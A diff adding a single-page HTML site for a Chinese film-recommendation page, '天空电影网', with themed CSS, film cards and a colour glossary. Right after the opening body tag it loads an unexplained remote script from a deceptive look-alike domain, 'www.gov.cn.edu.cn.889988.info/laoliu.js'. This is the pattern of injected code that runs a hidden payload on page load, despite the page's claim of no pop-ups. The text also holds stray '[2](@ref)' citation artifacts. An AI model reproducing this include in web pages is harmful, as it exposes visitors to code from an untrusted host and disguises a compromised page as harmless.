@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>天空电影网 - 云端放映舱 · 云层片单/黄昏动画/星轨科幻</title>
+<meta name="description" content="天空电影网，云端放映舱风影视单页：深靛蓝天幕、云白晚霞粉、云层片单、黄昏动画带、星轨科幻架、天空词典。官网 https://tiankongdianyingwang-h5.github.io">
+<meta name="keywords" content="天空电影网, 云端电影, 黄昏动画, 星轨科幻, 云层片单, 天空美学">
+<meta name="author" content="天空电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#0d1530">
+<style>
+:root{
+  --bg:#0d1530;
+  --bg2:#131d44;
+  --panel:#16204e;
+  --line:rgba(155,140,255,.28);
+  --white:#eaf2ff;
+  --pink:#ff9ec4;
+  --purple:#9b8cff;
+  --green:#7ef0c8;
+  --vermilion:#ff5d3b;
+  --muted:#9aa6cf;
+  --ink:#eef3ff;
+  --shadow:0 18px 40px rgba(0,0,0,.5);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:64px}
+body{
+  background:
+    radial-gradient(560px 340px at 82% -10%,rgba(255,158,196,.20),transparent),
+    radial-gradient(520px 360px at 10% 6%,rgba(155,140,255,.22),transparent),
+    radial-gradient(420px 260px at 60% 120%,rgba(126,240,200,.14),transparent),
+    linear-gradient(180deg,#0d1530,#101a3c 60%,#0c1430);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei",Segoe UI,system-ui,sans-serif;
+  line-height:1.8;
+}
+a{color:var(--pink);text-decoration:none}
+
+.bar{position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;gap:10px;
+  padding:12px 18px;border-bottom:1px solid var(--line);background:rgba(13,21,48,.82);backdrop-filter:blur(10px);}
+.logo{font-weight:900;font-size:20px;letter-spacing:.5px}
+.logo b{color:var(--pink)}
+.logo span{font-size:10px;color:var(--muted);letter-spacing:4px;display:block;margin-top:-3px}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:12px;padding:6px 12px;border:1px solid var(--line);border-radius:999px;background:var(--panel);color:var(--white)}
+.nav a:hover{border-color:var(--pink);color:var(--pink);box-shadow:0 0 12px rgba(255,158,196,.35)}
+
+.hero{position:relative;max-width:1060px;margin:0 auto;padding:58px 20px 28px;overflow:hidden;text-align:center}
+.sky{position:absolute;inset:8px 12px auto 12px;height:200px;border-radius:22px;
+  background:linear-gradient(120deg,rgba(155,140,255,.35),rgba(255,158,196,.28),rgba(126,240,200,.18));
+  filter:blur(34px);z-index:0}
+.comet{position:absolute;top:14px;right:22px;width:120px;height:2px;
+  background:linear-gradient(90deg,transparent,var(--green));transform:rotate(-18deg);box-shadow:0 0 14px var(--green);z-index:2}
+.comet::after{content:"";position:absolute;right:0;top:-3px;width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 12px var(--green)}
+.kicker{position:relative;z-index:2;font-family:Consolas,monospace;font-size:12px;color:var(--green);letter-spacing:2px}
+.hero h1{position:relative;z-index:2;font-size:34px;margin:10px 0 8px;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--pink)}
+.hero p{position:relative;z-index:2;color:var(--muted);max-width:620px;margin:0 auto 14px;font-size:15px}
+.hero .url{position:relative;z-index:2;display:inline-block;font-family:Consolas,monospace;font-size:13px;background:var(--panel);border:1px dashed var(--purple);color:var(--purple);padding:8px 16px;border-radius:999px}
+.metrics{position:relative;z-index:2;display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:18px}
+.metrics div{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:12px 16px;min-width:108px}
+.metrics b{display:block;font-size:20px;color:var(--pink);font-family:Consolas,monospace}
+.metrics small{color:var(--muted);font-size:12px}
+
+.wrap{max-width:1080px;margin:0 auto;padding:18px 20px 40px}
+.sec{display:flex;align-items:baseline;gap:10px;margin:30px 0 16px}
+.sec h2{font-size:21px;color:var(--white);font-weight:900}
+.sec h2 b{color:var(--pink)}
+.sec small{color:var(--muted);font-size:12px;letter-spacing:1px}
+.sec .chip{margin-left:auto;font-size:11px;color:#0d1530;background:var(--green);padding:3px 10px;border-radius:999px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.card{background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);border-radius:18px;overflow:hidden;box-shadow:var(--shadow);transition:.25s}
+.card:hover{transform:translateY(-5px);border-color:var(--pink);box-shadow:0 0 24px rgba(255,158,196,.28)}
+.cap{height:96px;display:flex;align-items:center;justify-content:center;gap:8px;font-size:30px;color:#0d1530;position:relative}
+.cap::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.22),transparent 55%)}
+.card:nth-child(6n+1) .cap{background:linear-gradient(135deg,#eaf2ff,#9b8cff)}
+.card:nth-child(6n+2) .cap{background:linear-gradient(135deg,#ff9ec4,#ff5d3b)}
+.card:nth-child(6n+3) .cap{background:linear-gradient(135deg,#7ef0c8,#36b98a)}
+.card:nth-child(6n+4) .cap{background:linear-gradient(135deg,#9b8cff,#5b4bd0)}
+.card:nth-child(6n+5) .cap{background:linear-gradient(135deg,#bcd6ff,#6f9bff)}
+.card:nth-child(6n+6) .cap{background:linear-gradient(135deg,#ffe6a7,#ff9ec4)}
+.body{padding:14px}
+.body h3{font-size:16px;color:var(--white);margin-bottom:3px}
+.body p{font-size:13px;color:var(--muted);margin-bottom:8px}
+.spec{display:flex;gap:6px;flex-wrap:wrap}
+.s{font-size:11px;font-family:Consolas,monospace;padding:2px 8px;border-radius:999px;background:#0d1530;border:1px solid var(--line);color:var(--green)}
+.mood{margin-top:8px;font-size:12px;color:var(--pink);font-family:Consolas,monospace}
+
+.strip{display:flex;gap:12px;overflow-x:auto;padding-bottom:6px}
+.anime{flex:0 0 230px;background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);border-radius:16px;padding:14px;box-shadow:var(--shadow)}
+.anime .tag{font-size:11px;font-weight:800;color:#0d1530;background:var(--pink);padding:2px 9px;border-radius:999px}
+.anime h3{font-size:15px;color:var(--white);margin:8px 0 3px}
+.anime p{font-size:12px;color:var(--muted)}
+
+.cols{display:grid;grid-template-columns:1.2fr .8fr;gap:18px;margin-top:26px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:18px}
+.panel h3{font-size:17px;color:var(--pink);margin-bottom:12px}
+.gloss li{list-style:none;padding:9px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--white)}
+.gloss li:last-child{border-bottom:none}
+.gloss b{color:var(--green);font-family:Consolas,monospace}
+
+.about p{color:var(--muted);font-size:14px;margin-bottom:8px}
+.about code{background:#0d1530;border:1px solid var(--line);color:var(--green);padding:2px 7px;border-radius:7px;font-family:Consolas,monospace}
+.foot{text-align:center;padding:26px 20px;border-top:1px solid var(--line);color:var(--muted);font-size:12px}
+
+@media(max-width:880px){.grid{grid-template-columns:repeat(2,1fr)}.cols{grid-template-columns:1fr}}
+@media(max-width:540px){.grid{grid-template-columns:1fr}.hero h1{font-size:26px}.comet{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bar">
+  <div class="logo"><b>天空</b>电影网<span>CLOUDSCAPE CINEMA</span></div>
+  <nav class="nav">
+    <a href="#home">云端舱</a>
+    <a href="#cloud">云层片单</a>
+    <a href="#dusk">黄昏动画</a>
+    <a href="#star">星轨科幻</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<section class="hero" id="home">
+  <div class="sky"></div>
+  <div class="comet"></div>
+  <span class="kicker">// sky.open({ layer:"twilight" })</span>
+  <h1>天空电影网 · <em>云端放映舱</em></h1>
+  <p>不弹广告、不卖包月、不解析盗版源。把电影按“云层 / 黄昏 / 星轨”分层放：云上是治愈，黄昏是动画，星轨是科幻。像坐在候影区看天色变。 [2](@ref)</p>
+  <div class="url">https://tiankongdianyingwang-h5.github.io</div>
+  <div class="metrics">
+    <div><b>云层</b><small>治愈 / 日常</small></div>
+    <div><b>黄昏</b><small>动画 / 青春</small></div>
+    <div><b>星轨</b><small>科幻 / 宇宙</small></div>
+    <div><b>0</b><small>弹窗/下载器</small></div>
+  </div>
+</section>
+
+<div class="wrap">
+
+  <div class="sec" id="cloud">
+    <h2>☁️ 云层片单 · <b>飘着看</b></h2><small>cloud shelf</small><span class="chip">轻盈档</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="cap">🌾🍞</div>
+      <div class="body">
+        <h3>小森林</h3>
+        <p>切菜声、烤面包香、雪落声。像云层下面最安静的那块田。</p>
+        <div class="spec"><span class="s">治愈</span><span class="s">四季</span><span class="s">1080P</span></div>
+        <div class="mood">mood：松松软软</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🐟🌊</div>
+      <div class="body">
+        <h3>海街日记</h3>
+        <p>海边老屋、梅子酒、姐妹对话。云走得很慢，故事也走得很慢。</p>
+        <div class="spec"><span class="s">家庭</span><span class="s">是枝裕和</span><span class="s">治愈</span></div>
+        <div class="mood">mood：潮风微咸</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🎐🏘️</div>
+      <div class="body">
+        <h3>步履不停</h3>
+        <p>一天、一家人、一句没说出口的话。云层片单的“回头看”位。</p>
+        <div class="spec"><span class="s">剧情</span><span class="s">日常</span><span class="s">国语/原声</span></div>
+        <div class="mood">mood：午后回响</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec" id="dusk">
+    <h2>🌇 黄昏动画带 · <b>天色最浓时放</b></h2><small>twilight anime</small><span class="chip">新海诚感</span>
+  </div>
+  <div class="strip">
+    <div class="anime"><span class="tag">黄昏/彗星</span><h3>你的名字。</h3><p>靛蓝转粉紫，彗星划过，两个名字在黄昏里找彼此。</p></div>
+    <div class="anime"><span class="tag">霞光/海边</span><h3>夏日大作战</h3><p>夏夜、烟花、家族群聊，暖朱线把人和人系住。</p></div>
+    <div class="anime"><span class="tag">云层/飞行</span><h3>起风了</h3><p>云海上写飞机，天空不是背景，是主角。</p></div>
+    <div class="anime"><span class="tag">星轨/成长</span><h3>星之声</h3><p>手机短信跨过光年，黄昏和宇宙叠在一起。</p></div>
+    <div class="anime"><span class="tag">粉紫/校园</span><h3>天气之子</h3><p>晴雨、鸟居、东京天际线，云层里藏着一个决定。</p></div>
+    <div class="anime"><span class="tag">暮色/猫</span><h3>猫的报恩</h3><p>下班路上天忽然变粉，猫国在黄昏缝隙里开门。</p></div>
+  </div>
+
+  <div class="sec" id="star">
+    <h2>🌌 星轨科幻架 · <b>抬头看</b></h2><small>star trail</small><span class="chip">宇宙档</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="cap">🚀🌌</div>
+      <div class="body">
+        <h3>星际穿越</h3>
+        <p>虫洞、黑洞、五维书房。星轨一转，时间比云还轻。</p>
+        <div class="spec"><span class="s">硬科幻</span><span class="s">IMAX</span><span class="s">HDR</span></div>
+        <div class="mood">sky：深蓝+尘光</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🪐🟢</div>
+      <div class="body">
+        <h3>2001 太空漫游</h3>
+        <p>骨棒抛成飞船，星孩出生。天空电影网的“原点片”。</p>
+        <div class="spec"><span class="s">哲学科幻</span><span class="s">库布里克</span><span class="s">4K</span></div>
+        <div class="mood">sky：寂静星海</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🛸💚</div>
+      <div class="body">
+        <h3>银翼杀手 2049</h3>
+        <p>霓虹雪、橙色雾、飞行车划过紫天。科幻也可以很“天色”。</p>
+        <div class="spec"><span class="s">赛博</span><span class="s">维伦纽瓦</span><span class="s">Atmos</span></div>
+        <div class="mood">sky：污染式晚霞</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="cols">
+    <section class="panel">
+      <h3>🎨 天空配色系统</h3>
+      <ul class="gloss">
+        <li><b>深靛蓝</b> #0d1530 —— 夜还没全黑的天幕底</li>
+        <li><b>云白</b> #eaf2ff —— 云边高光，不是纯白</li>
+        <li><b>晚霞粉</b> #ff9ec4 —— 黄昏第一层情绪色</li>
+        <li><b>霞光紫</b> #9b8cff —— 天色融化时的中间调</li>
+        <li><b>彗星绿</b> #7ef0c8 —— 冷色里的一道光</li>
+        <li><b>暖朱线</b> #ff5d3b —— 人和人之间的“红线”</li>
+      </ul>
+    </section>
+    <section class="panel">
+      <h3>📖 天空词典</h3>
+      <ul class="gloss">
+        <li><b>云层片单</b> = 治愈/日常/不费脑</li>
+        <li><b>黄昏动画</b> = 天色即情绪，粉紫蓝同框</li>
+        <li><b>星轨科幻</b> = 宇宙、时间、光年、孤独感</li>
+        <li><b>彗星绿</b> = 天空里突然出现的冷光</li>
+        <li><b>暖朱线</b> = 把两个时空系在一起的绳</li>
+      </ul>
+    </section>
+  </div>
+
+  <section class="panel about" style="margin-top:26px">
+    <h3>🌤️ 关于天空电影网</h3>
+    <p><strong>天空电影网</strong> 是“云端放映舱 / 黄昏天幕”风影视单页：深靛蓝天幕、云白晚霞粉、彗星绿冷光、暖朱线收口；云层片单+黄昏动画带+星轨科幻架+天空词典，是新海诚式天空美学在影视单页上的落地。[2](@ref)</p>
+    <p>官网：<code>https://tiankongdianyingwang-h5.github.io</code></p>
+    <p>内链全用 <code>#</code> 占位，CSS/DIV 全内联，不生成 robots.txt / sitemap.xml，GitHub Pages 直传即可；必应收录靠标题、描述、语义结构、移动端体验。</p>
+    <p>本舱不提供磁力链接、不解析第三方源、不挂播放器下载、不卖包月、不托管受版权保护视频。看天空系电影，走正版流媒体、资料馆放映、UHD 碟。</p>
+  </section>
+
+</div>
+
+<footer class="foot">
+  © 2026 天空电影网 · tiankongdianyingwang-h5.github.io · 云走慢一点，片就开始了 🌇
+</footer>
+
+</body>
+</html>
